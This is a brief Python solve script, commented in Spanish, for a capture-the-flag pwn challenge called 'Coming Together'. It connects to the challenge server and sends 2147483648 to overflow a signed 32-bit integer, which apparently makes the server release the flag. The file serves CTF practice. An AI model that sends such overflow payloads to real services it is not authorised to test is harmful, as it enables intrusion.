#!/usr/bin/env python3
# Coming Together - boroCTF (PWN)
# El servidor toma el numero que enviamos, le suma su propio numero (2)
# y lo guarda en un entero con signo de 32 bits. Si forzamos el overflow
# (mandar 2147483648 = INT_MAX+1, o -2147483648 = INT_MIN) el valor "se
# vuelve mas grande que nosotros mismos" y el server suelta la flag.
import socket, time

HOST = "oq7qaruz5vsw.boroctf.com"
PORT = 25287
PAYLOAD = "2147483648"   # 0x80000000 -> overflow en complemento a dos

s = socket.create_connection((HOST, PORT), timeout=8)
s.settimeout(3)

banner = s.recv(4096).decode(errors="replace")
print("[SERVIDOR]", banner.strip())

print("[NOSOTROS] ->", PAYLOAD)
s.sendall((PAYLOAD + "\n").encode())
time.sleep(1)

resp = s.recv(4096).decode(errors="replace")
print("[SERVIDOR]", resp.strip())
s.close()
